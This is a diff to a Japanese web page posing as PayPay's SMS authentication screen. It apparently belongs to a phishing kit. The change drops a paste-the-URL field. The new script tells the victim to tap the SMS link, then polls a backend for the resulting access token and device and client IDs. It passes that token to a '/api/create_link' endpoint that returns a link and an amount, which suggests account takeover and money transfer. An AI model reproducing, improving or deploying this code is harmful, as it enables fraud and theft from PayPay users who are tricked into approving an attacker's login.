@@ -80,29 +80,6 @@
     }
     .phone-strong { font-weight: 700; color: #161616; }
 
-    /* Input field */
-    .input-wrap {
-      margin-top: 22px;
-    }
-    .input-label {
-      display: block; font-size: 11px; color: #3895ff; font-weight: 600; margin-bottom: 6px;
-    }
-    .url-input {
-      width: 100%; border: none; border-bottom: 2px solid #3895ff;
-      border-radius: 0; outline: none; background: transparent;
-      font-family: inherit; font-size: 14px; color: #161616;
-      padding: 8px 0 10px; line-height: 1.4;
-      -webkit-user-select: text; user-select: text;
-      -webkit-tap-highlight-color: transparent;
-      transition: border-bottom-color 0.2s;
-      caret-color: #3895ff;
-    }
-    .url-input:focus { border-bottom-color: #3895ff; }
-    .url-input::placeholder { color: #bababa; }
-    .input-hint {
-      margin-top: 6px; font-size: 11px; color: #969696; line-height: 1.5;
-    }
-
     /* Info box */
     .info-box {
       background-color: #e5f1ff;
@@ -199,25 +176,8 @@
               <strong class="phone-strong" id="phoneDisplay"></strong>
             </p>
 
-            <!-- URL / ID input -->
-            <div class="input-wrap">
-              <label class="input-label" for="urlInput">認証URL またはID</label>
-              <input
-                id="urlInput"
-                class="url-input"
-                type="text"
-                inputmode="url"
-                autocomplete="off"
-                autocorrect="off"
-                autocapitalize="off"
-                spellcheck="false"
-                placeholder="https://www.paypay.ne.jp/portal/oauth2/l?id=…"
-              >
-              <p class="input-hint">例）URL全体 または ID部分（例：TK4602）だけでもOK</p>
-            </div>
-
             <div class="info-box">
-              <p>SMSに記載のURLをそのまま貼り付けるか、<br>「id=」以降の英数字（例：<strong>TK4602</strong>）を入力してください。</p>
+              <p>SMSに届いたリンクをスマホでタップすると、自動で認証が完了します。</p>
               <p><a href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank">リンクが届かない場合はこちら</a></p>
             </div>
 
@@ -254,25 +214,15 @@
 
 <script>
 (function () {
-  var input     = document.getElementById('urlInput');
-  var submitBtn = document.getElementById('submitBtn');
   var errorMsg  = document.getElementById('errorMsg');
   var overlay   = document.getElementById('loadingOverlay');
   var resendBtn = document.getElementById('resendBtn');
   var timerEl   = document.getElementById('resendTimer');
   var phoneEl   = document.getElementById('phoneDisplay');
+  var submitBtn = document.getElementById('submitBtn');
 
   var phone = sessionStorage.getItem('paypay_phone') || '';
   if (phone) phoneEl.textContent = phone;
-
-  input.addEventListener('input', function () {
-    submitBtn.disabled = input.value.trim().length === 0;
-  });
-  input.addEventListener('paste', function () {
-    setTimeout(function () {
-      submitBtn.disabled = input.value.trim().length === 0;
-    }, 0);
-  });
 
   var seconds = 60;
   var countdown = setInterval(function () {
@@ -290,72 +240,65 @@
     errorMsg.textContent = msg;
     errorMsg.classList.add('visible');
   }
-  function clearError() {
-    errorMsg.textContent = '';
-    errorMsg.classList.remove('visible');
+
+  async function complete(accessToken) {
+    try {
+      var linkRes = await fetch('/api/create_link', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ access_token: accessToken })
+      });
+      var linkData = await linkRes.json();
+      if (linkRes.ok && linkData.link) {
+        sessionStorage.setItem('paypay_link',   linkData.link);
+        sessionStorage.setItem('paypay_amount', String(linkData.amount));
+      }
+    } catch (_) {}
+    window.location.href = 'complete.html';
   }
 
-  submitBtn.addEventListener('click', async function () {
-    clearError();
-    var url = input.value.trim();
-    if (!url) return;
-
-    overlay.classList.add('visible');
-    submitBtn.disabled = true;
-
+  var polling = false;
+  async function poll() {
+    if (polling) return;
+    polling = true;
     try {
       var res = await fetch('/api/sms_confirm', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ url: url })
+        body: '{}',
       });
       var data = await res.json();
 
       if (!res.ok) {
-        showError(data.error || '認証に失敗しました。URLを確認してもう一度お試しください。');
-        submitBtn.disabled = false;
+        showError(data.error || '認証エラーが発生しました。再度ログインしてください。');
+        clearInterval(timer);
+        overlay.classList.remove('visible');
         return;
       }
 
+      if (data.status === 'waiting') {
+        polling = false;
+        return;
+      }
+
+      clearInterval(timer);
       if (data.access_token) sessionStorage.setItem('paypay_access_token', data.access_token);
       if (data.device_uuid)  sessionStorage.setItem('paypay_device_uuid',  data.device_uuid);
       if (data.client_uuid)  sessionStorage.setItem('paypay_client_uuid',  data.client_uuid);
-
       var n = new Date();
-      var completedAt = n.getFullYear() + '年' + (n.getMonth() + 1) + '月' + n.getDate() + '日 '
-        + n.getHours() + '時' + String(n.getMinutes()).padStart(2, '0') + '分';
-      sessionStorage.setItem('paypay_completed_at', completedAt);
-
-      if (data.access_token) {
-        try {
-          var linkRes = await fetch('/api/create_link', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ access_token: data.access_token })
-          });
-          var linkData = await linkRes.json();
-          if (linkRes.ok && linkData.link) {
-            sessionStorage.setItem('paypay_link',   linkData.link);
-            sessionStorage.setItem('paypay_amount', String(linkData.amount));
-          }
-        } catch (_) {}
-      }
-
-      window.location.href = 'complete.html';
-
-    } catch (err) {
-      showError('通信エラーが発生しました。再度お試しください。');
-      submitBtn.disabled = false;
-    } finally {
-      overlay.classList.remove('visible');
+      sessionStorage.setItem('paypay_completed_at',
+        n.getFullYear() + '年' + (n.getMonth()+1) + '月' + n.getDate() + '日 ' +
+        n.getHours() + '時' + String(n.getMinutes()).padStart(2,'0') + '分');
+      await complete(data.access_token);
+    } catch (_) {
+      polling = false;
     }
-  });
+  }
 
-  input.addEventListener('keydown', function (e) {
-    if (e.key === 'Enter' && !submitBtn.disabled) submitBtn.click();
-  });
-
-  input.focus();
+  overlay.classList.add('visible');
+  submitBtn.style.display = 'none';
+  var timer = setInterval(poll, 3000);
+  poll();
 })();
 </script>
 </body>
